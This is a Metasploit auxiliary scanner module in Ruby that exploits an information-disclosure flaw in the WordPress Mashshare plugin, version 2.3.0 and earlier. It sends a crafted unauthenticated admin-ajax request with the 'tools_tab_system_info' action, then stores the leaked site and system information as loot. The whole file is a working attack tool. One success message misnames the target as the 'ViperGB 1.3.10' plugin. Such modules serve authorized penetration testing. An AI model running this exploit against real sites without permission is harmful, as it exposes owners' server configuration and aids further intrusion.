##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress Mashshare Plugin Info Disclosure',
      'Description' => %q{
      This module attempts to exploit a information disclosure in Mashshare for WordPress,
      version 2.3.0 and likely prior in order if the instance is vulnerable.
      },
      'Author'      =>
        [
          'James Hooker', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['OSVDB', '120988'],
          ['WPVDB', '7936'],
          ['URL', 'https://research.g0blin.co.uk/g0blin-00045/']
        ],
      'DisclosureDate' => 'Apr 25 2015'
    ))
  end

  def check
    check_plugin_version_from_readme('mashsharer', '2.3.1')
  end

  def run_host(ip)

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_admin_ajax),
      'vars_get'  => {
        'action'    => '-',
        'mashsb-action' => 'tools_tab_system_info'
      }
    )

    unless res && res.body
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && res.body.include?('Site Info')
      print_good("#{peer} - Vulnerable to Information Disclosure the \"ViperGB 1.3.10\" plugin for WordPress")
      vprint_good("Information Disclosure: #{res.body}")
      p = store_loot('wp_mashshare', 'text/html', ip, res.body, 'tools_tab_system_info')
      print_good("Save in: #{p}")
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
